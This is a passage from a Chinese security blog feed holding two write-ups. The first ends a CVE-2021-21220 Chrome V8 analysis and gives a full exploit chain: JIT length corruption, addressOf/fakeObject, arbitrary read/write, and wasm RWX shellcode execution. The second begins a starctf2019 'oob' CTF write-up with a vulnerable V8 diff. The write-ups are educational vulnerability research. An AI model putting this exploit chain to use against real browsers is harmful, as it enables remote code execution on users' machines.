class="keyword">if</span>(x==-<span class="number">1</span>) x = <span class="number">0</span>;<span class="comment">// predicted = 0; actual = 1</span></span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(x);<span class="comment">// predicted = 0; actual = 1</span></span><br><span class="line">arr.shift();<span class="comment">// predicted = 0; actual = -1，这里是比较难以理解的部分，之前解释器在处理shift的时候判断x的值为0，正常执行，所以在JIT阶段优化掉了边界检查；而在JIT阶段x==1，此时JIT仍将x的值当作0，由于x实际为1，所以shift将对数组长度做减一操作，再由于此时JIT将x的值当作0，所以最终数组的长度为0-1 == -1，这样构造出了超长的数组，可以进行很高的相对地址读写权限。</span></span><br><span class="line"><span class="keyword">var</span> cor = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line"><span class="keyword">return</span> [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> x = foo(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x30000</span>;++i)</span><br><span class="line">    foo(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = foo(<span class="literal">false</span>);</span><br><span class="line">print(x[<span class="number">0</span>].length);</span><br><span class="line">%DebugPrint(x[<span class="number">0</span>]);                    </span><br><span class="line">%SystemBreak();                                </span><br></pre></td></tr></table></figure><p>在LoadElimination阶段，可以看到将-1存储到#185 StoreElement，并传递给#184 StoreField 之后继续传递到#192 EffedtPhi，而调用#190 ArrayShift也会经由#192 EffectPhi处理得到的参数。</p><p><img src="/2021/04/30/CVE-2021-21220/image-20210428101114540.png" alt="image-20210428101114540"></p><p>调试验证结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">-1</span><br><span class="line">DebugPrint: 0x351f0833dd31: [JSArray]</span><br><span class="line"> - map: 0x351f082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x351f0820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x351f0833dd25 &lt;FixedArray[67244566]&gt; [HOLEY_SMI_ELEMENTS];可见构建了超长数组：FixedArray[67244566]</span><br><span class="line"> - length: -1</span><br><span class="line"> - properties: 0x351f0804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x351f080446c1: [String] in ReadOnlySpace: #length: 0x351f0818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x351f0833dd25 &lt;FixedArray[67244566]&gt; &#123;</span><br><span class="line">           0: 0x351f0804242d &lt;the_hole&gt;</span><br><span class="line">           1: 0x351f082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line">           2: 0x351f0804222d &lt;FixedArray[0]&gt;</span><br><span class="line">           3: 0x351f0833dd25 &lt;FixedArray[67244566]&gt;</span><br><span class="line">           4: -1</span><br><span class="line">           5: 0x351f08042a95 &lt;Map&gt;</span><br><span class="line">           6: 3</span><br><span class="line">           7: -858993459</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/10wx 0x351f0833dd24</span><br><span class="line">0x351f0833dd24: 0x08042205      0x0804242d      0x0804242d      0x082439c9</span><br><span class="line">0x351f0833dd34: 0x0804222d      0x0833dd25      0xfffffffe      0x08042a95;0xfffffffe为-1，</span><br><span class="line">0x351f0833dd44: 0x00000006      0x9999999</span><br></pre></td></tr></table></figure><h5 id="（2）addressOf和fakeObject实现"><a href="#（2）addressOf和fakeObject实现" class="headerlink" title="（2）addressOf和fakeObject实现"></a>（2）addressOf和fakeObject实现</h5><p>之后确定arr和cor的偏移，方便通过对arr的相对地址读写进行addressOf和fakeObject的实现。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = x[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> cor = x[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">const</span> idx = <span class="number">6</span>;</span><br><span class="line"><span class="comment">//arr[idx+11] = 0x4242;  </span></span><br><span class="line">arr[idx+<span class="number">10</span>] = <span class="number">0x2333</span>;                           <span class="comment">//arr[idx+10]位置处存放cor的length属性，在这里可以将cor的长度扩展造成相对地址读写。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    arr[idx+<span class="number">1</span>] = k;</span><br><span class="line">    <span class="keyword">return</span> f2big(cor[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;         <span class="comment">//由于只有Array对象有shift方法，而Array对象的每个元素为四字节，我们只能泄露低四字节的地址（不排除有一些我不清楚的方法可以泄露八字节）,而这里的八字节因为前四字节已经被位运算清零了。实际上这里需要的也仅仅是四字节读写的能力，引擎会自动填充前面的基址。</span></span><br><span class="line">&#125;<span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    cor[<span class="number">0</span>] = big2f(k);</span><br><span class="line">    <span class="keyword">return</span> arr[idx+<span class="number">1</span>];                          <span class="comment">//返回的也只是低四字节</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> test = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">test_addr = addressOf(test);</span><br><span class="line"><span class="built_in">console</span>.log(test_addr);</span><br><span class="line">%DebugPrint(test);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>简单介绍下上述代码，arr[idx+10]为cor的length属性，可以直接修改该值为大于原长度的值，这样cor数组也可以进行越界读写了，cor与arr的区别在于cor的相对读写可以操作八个字节。然后是addressOf与fakeObject原语的构造，在这里，由于arr和cor可以通过不同的索引值访问相同的空间，这样通过不同类型的数组读取出来的值的类型是不一样的（元素靠数组的map来确定类型），这样很容易就可以实现类型混淆。前面确定了cor与arr的内存相对偏移，便可以进行addressOf和fakeObject的实现。</p><p>调试来验证结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">000000000811d8b9</span><br><span class="line">DebugPrint: 0x19b00811d8b9: [JSArray]</span><br><span class="line"> - map: 0x19b0082439f1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x19b00820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x19b00811d8d1 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x19b00804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x19b0080446c1: [String] in ReadOnlySpace: #length: 0x19b00818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x19b00811d8d1 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h5 id="（3）任意读写原语实现"><a href="#（3）任意读写原语实现" class="headerlink" title="（3）任意读写原语实现"></a>（3）任意读写原语实现</h5><p>相关代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var float_array_map = f2big(cor[3]);              </span><br><span class="line">var arr2 = [big2f(float_array_map), 1.2, 2.3, 3.4];         //创建伪造对象的数组</span><br><span class="line">var fake = fakeObject(addressOf(arr2) + 0x20n);             //通过fakeObject伪造对象</span><br><span class="line">function arbread(addr) &#123;</span><br><span class="line">    if (addr % 2n == 0) </span><br><span class="line">        addr += 1n;</span><br><span class="line">    arr2[1] = big2f((2n &lt;&lt; 32n) + addr - 8n);               //创建伪造对象的数组，这里arr2[0] == fake_map, arr2[1] == arr2_length+elements_addr；2n &lt;&lt; 32n代表arr2的长度。大于等于2即可。</span><br><span class="line">    return (fake[0]);                                       //将addr2的内存构造为：前四字节为伪造的对象的长度，后四字节为要读取信息的地址。，fake[0]相当于那个修改任意地址的指针。</span><br><span class="line">&#125;function arbwrite(addr, val) &#123;</span><br><span class="line">    if (addr % 2n == 0) </span><br><span class="line">        addr += 1n;</span><br><span class="line">    arr2[1] = big2f((2n &lt;&lt; 32n) + addr - 8n);</span><br><span class="line">    fake[0] = big2f(BigInt(val));                           </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体相关的点都已经在代码注释中标注出来了，唯一需要注意的可能就是arr2[1]和fake[0]的换算关系如何得出，这个可以通过下面的内存状态尝试理解并编写相应的原语。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│  0x1fa7082aaea0 ◂— 0x804222d082439f1; arr_map</span><br><span class="line">01:0008│  0x1fa7082aaea8 ◂— 0x8082aaeb9    ; arr_length + arr_elements_addr</span><br><span class="line">02:0010│  0x1fa7082aaeb0 ◂— 0x8213bc5080455b9</span><br><span class="line">03:0018│  0x1fa7082aaeb8 ◂— 0x808042a95    ; arr_elements_map</span><br><span class="line">04:0020│  0x1fa7082aaec0 ◂— 0x804222d082439f1;fake_maparr2[0]</span><br><span class="line">05:0028│  0x1fa7082aaec8 ◂— 0x3ff3333333333333;fake_length + fake_element_addr  arr2[1]</span><br><span class="line">06:0030│  0x1fa7082aaed0 ◂— 0x4002666666666666</span><br><span class="line">07:0038│  0x1fa7082aaed8 ◂— 0x400b333333333333 (&#x27;333333\x0b@&#x27;)</span><br></pre></td></tr></table></figure><p>个人对上述的推理过程如下：</p><p>[0x28] == (2n &lt;&lt; 32n) + addr - 8n</p><p>arr2[1]  -&gt; [0x0+0x8]+0x8+0x8 -&gt; 0x18+0x8+0x8 -&gt; 0x28</p><p>fake[0] -&gt; [0x20+0x8]+0x8 -&gt;  (2n &lt;&lt; 32n) + addr - 8n+0x8 -&gt; (2n &lt;&lt; 32n) + addr</p><p>这样就可以通过操作fake[0]来进行任意地址读写。</p><h5 id="4-wasm利用"><a href="#4-wasm利用" class="headerlink" title="(4)wasm利用"></a>(4)wasm利用</h5><p>这里就是因为wasm会生成一块rwx空间，通过向该空间写入shellcode并调用达到命令执行的目的。</p><p>代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//msfvenom -p linux/x64/exec CMD=whoami -f num</span></span><br><span class="line"><span class="keyword">let</span> shellcode = [<span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x99</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x52</span>, <span class="number">0xe8</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x6f</span>, <span class="number">0x61</span>, <span class="number">0x6d</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>];</span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x150</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_shellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf2);</span><br><span class="line">    <span class="keyword">let</span> buf_addr = addressOf(buf2);</span><br><span class="line">    <span class="keyword">let</span> backing_store_addr = buf_addr + <span class="number">0x14n</span>;</span><br><span class="line">    arbwrite(backing_store_addr, addr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint8(i, shellcode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = f2big(arbread(addressOf(wasmInstance) + <span class="number">0x68n</span>));                </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Address of rwx page: &quot;</span> + rwx_page_addr.toString(<span class="number">16</span>));</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><p>最终复现如下</p><p><img src="/2021/04/30/CVE-2021-21220/image-20210427231450948.png" alt="image-20210427231450948"></p><h3 id="3、漏洞修复"><a href="#3、漏洞修复" class="headerlink" title="3、漏洞修复"></a>3、漏洞修复</h3><p>issue 1196683</p><h2 id="四、总结与思考"><a href="#四、总结与思考" class="headerlink" title="四、总结与思考"></a>四、总结与思考</h2><p>该漏洞分析是个人的第一个Chrome的真实漏洞分析，所以过程会比较详细，但是详细不意味着面面俱到。我始终相信，二进制漏洞分析真实的调试一定是必不可少的，我想要表达的一些东西都存在于调试信息中了，自然就没有必要进行过多的文字陈述。</p><p>由于JIT优化机制的存在，出现类似于这种类型的漏洞一定还是存在的，但是这种漏洞是无法绕过沙箱的，所以用户开启沙箱使用浏览器可以在很大程度上防止恶意代码的攻击，但仍有一些漏洞是可以绕过沙箱对宿主机进行攻击，这就需要我们对不明链接保持谨慎的习惯，这样就可以很好的避免0day浏览器漏洞对我们的损害。</p><p>该文章的成型参考了很多篇优秀的文章[123]，感谢师傅们的开源精神，我也会将更多我的漏洞分析过程公开出来，为技术分享的氛围贡献一点绵薄之力。</p><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p>[1]. <a class="link"   href="https://mp.weixin.qq.com/s/O81Kw-ujcbjY_1S6dFKpxQ" >https://mp.weixin.qq.com/s/O81Kw-ujcbjY_1S6dFKpxQ<i class="fas fa-external-link-alt"></i></a></p><p>[2]. <a class="link"   href="https://github.com/r4j0x00/exploits/tree/master/chrome-0day" >https://github.com/r4j0x00/exploits/tree/master/chrome-0day<i class="fas fa-external-link-alt"></i></a></p><p>[3]. <a class="link"   href="https://mp.weixin.qq.com/s/yeu9IZSNrp1f_lK5oIdL9A" >https://mp.weixin.qq.com/s/yeu9IZSNrp1f_lK5oIdL9A<i class="fas fa-external-link-alt"></i></a></p><p>[4]. <a class="link"   href="https://www.ecma-international.org/publications-and-standards/standards/ecma-262/" >https://www.ecma-international.org/publications-and-standards/standards/ecma-262/<i class="fas fa-external-link-alt"></i></a></p><p>[5]. <a class="link"   href="https://v8.dev/blog/elements-kinds" >https://v8.dev/blog/elements-kinds<i class="fas fa-external-link-alt"></i></a></p><p>[6]. <a class="link"   href="https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-infinity-bug.html" >https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-infinity-bug.html<i class="fas fa-external-link-alt"></i></a></p><p>[7]. <a class="link"   href="https://bugs.chromium.org/p/v8/issues/detail?id=6380" >https://bugs.chromium.org/p/v8/issues/detail?id=6380<i class="fas fa-external-link-alt"></i></a></p><p>[8]. <a class="link"   href="https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html" >https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html<i class="fas fa-external-link-alt"></i></a></p><p>[9]. <a class="link"   href="https://v8.dev/blog/pointer-compression" >https://v8.dev/blog/pointer-compression<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;V8远程代码执行漏洞&quot;&gt;&lt;a href=&quot;#V8远程代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;V8远程代码执行漏洞&quot;&gt;&lt;/a&gt;V8远程代码执行漏洞&lt;/h1&gt;&lt;h2 id=&quot;一、漏洞信息&quot;&gt;&lt;a href=&quot;#一、漏洞信息&quot; class=&quot;</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="浏览器" scheme="https://fa1lr4in.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>starctf2019-oob</title>
    <link href="https://fa1lr4in.github.io/2021/04/21/starctf2019-oob/"/>
    <id>https://fa1lr4in.github.io/2021/04/21/starctf2019-oob/</id>
    <published>2021-04-21T11:37:19.000Z</published>
    <updated>2022-04-19T09:09:20.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="starctf2019-oob"><a href="#starctf2019-oob" class="headerlink" title="starctf2019-oob"></a>starctf2019-oob</h1><h2 id="1、环境复现"><a href="#1、环境复现" class="headerlink" title="1、环境复现"></a>1、环境复现</h2><p>1、搭建v8调试环境，并下载题目到指定目录（这里需要有v8调试环境搭建的基础，要做好git全局代理和bash全局代理的准备）</p><p>2、还原题目环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598<span class="comment">#设置v8分支</span></span><br><span class="line">gclient sync</span><br><span class="line">git apply ../oob.diff</span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure><h2 id="2、diff分析"><a href="#2、diff分析" class="headerlink" title="2、diff分析"></a>2、diff分析</h2><p>diff文件如下，其中主要的逻辑在于kArrayOob的具体实现部分，我直接在该段代码中将重要位置进行注释</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"> </span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();    //指定参数个数大于1的时候返回   </span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);   //将receiver对象强转成array对象</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());//elements为array对象的elements字段</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());//数组长度</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));//当参数为空，返回第length个元素的内容</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number()); //当参数为个数为1，就将第一个参数写入到数组中的第length个元素的值</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc 